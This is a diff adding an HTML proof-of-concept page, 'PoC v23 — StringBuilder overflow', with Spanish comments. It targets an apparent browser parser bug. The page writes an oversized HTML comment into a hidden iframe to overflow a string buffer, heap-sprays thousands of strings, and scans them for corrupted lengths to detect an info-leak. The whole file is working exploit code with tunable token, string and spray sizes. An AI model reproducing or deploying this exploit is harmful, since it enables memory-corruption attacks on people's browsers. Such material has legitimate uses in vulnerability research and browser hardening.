@@ -1,0 +1,80 @@
+<!DOCTYPE html><meta charset="utf-8">
+<title>The_Maxu PoC v23</title>
+<style>
+body{background:#111;color:#ddd;font:14px/1.4 monospace;margin:0;padding:8px}
+label{display:inline-block;margin-right:12px}input{width:70px}
+#log{border:1px solid #333;max-height:70vh;overflow:auto;white-space:pre-wrap;
+     padding:6px;margin-top:8px;font-size:12px}
+.ok{color:#8f8}.warn{color:#ff6}.fail{color:#f66}
+iframe{display:none} /* oculto */
+</style>
+
+<h2>PoC v23 — StringBuilder overflow</h2>
+
+<label>Token size (MiB): <input id="tokSize" type="number" step="0.01" value="0.50"></label>
+<label>String size (B):  <input id="strSize" type="number" value="512"></label>
+<label>Spray count (×1000): <input id="sprayCount" type="number" value="1"></label>
+<button id="run">Ejecutar</button>
+
+<pre id="log">(ready)</pre>
+<iframe id="box"></iframe>
+
+<script>
+const logEl=document.getElementById('log');
+const frame=document.getElementById('box');
+function log(m,c=''){const d=document.createElement('div');d.textContent=m;if(c)d.className=c;logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight;}
+
+const spray=[];                        // out of iframe
+function mkStr(n,ch='B'){return ch.repeat(n);}
+
+document.getElementById('run').onclick=()=>{
+    logEl.textContent='';
+    const tokMiB=parseFloat(document.getElementById('tokSize').value);
+    const strSize=parseInt(document.getElementById('strSize').value,10);
+    const sprayK=parseInt(document.getElementById('sprayCount').value,10);
+    if(!tokMiB||!strSize||!sprayK){alert('Valores inválidos');return;}
+
+    log(`- Iniciando con token ${tokMiB} MiB, spray ${sprayK}k×${strSize} B`);
+    runInIframe(tokMiB,strSize,sprayK);
+};
+
+function runInIframe(tokMiB,strSize,sprayK){
+    // Resetea iframe
+    frame.src='about:blank';
+    frame.onload=()=>{
+        const w=frame.contentWindow;
+        const d=w.document;
+        const bytes=Math.floor(tokMiB*1024*1024);
+        const payload='<!--'+ 'X'.repeat(bytes) +'-->';
+        log(`→ Enviando token (${bytes} bytes) al iframe…`);
+
+        // 1. Overflow
+        d.open(); d.write(payload); d.close();
+
+        // 2. Heap‑spray dentro DEL MISMO iframe (para mantener aislado)
+        w.setTimeout(()=>{
+            log(`→ Heap‑spray interno: ${sprayK*1000} cadenas de ${strSize} B…`);
+            w.spray=[];                       // spray dentro del iframe
+            const base=mkStr(strSize-12);
+            for(let i=0;i<sprayK*1000;i++) w.spray.push(base+i);
+
+            // 3. Enviamos resultados al parent
+            w.setTimeout(()=>analyzeSpray(w.spray,strSize),50);
+        },80);
+    };
+}
+
+function analyzeSpray(array,strSize){
+    let corrupt=0;
+    array.forEach((s,i)=>{
+        if(!s)return;
+        if(s.length!==strSize){
+            corrupt++;
+            log(`‼ Cadena #${i} len=${s.length}  head=\"${s.slice(0,20)}\"`,'warn');
+            if(corrupt>=10)return;
+        }
+    });
+    if(!corrupt) log('— Sin cadenas corruptas (token pequeño o crash).','fail');
+    else         log(`Got it! ${corrupt} cadenas corruptas detectadas → info‑leak!`,'ok');
+}
+</script>
